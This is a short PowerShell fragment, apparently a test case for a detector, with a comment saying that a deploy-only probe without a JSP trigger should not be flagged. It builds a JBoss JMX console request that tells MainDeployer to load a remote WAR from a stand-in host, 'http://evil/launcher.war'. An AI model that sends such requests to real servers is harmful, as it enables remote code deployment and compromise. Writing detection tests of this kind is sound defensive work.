# Deploy-only probe without the JSP trigger: no deploy-trigger conviction.
$deploy = '/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=http://evil/launcher.war'
$req = New-Object System.Net.WebClient
$req.Method = 'HEAD'
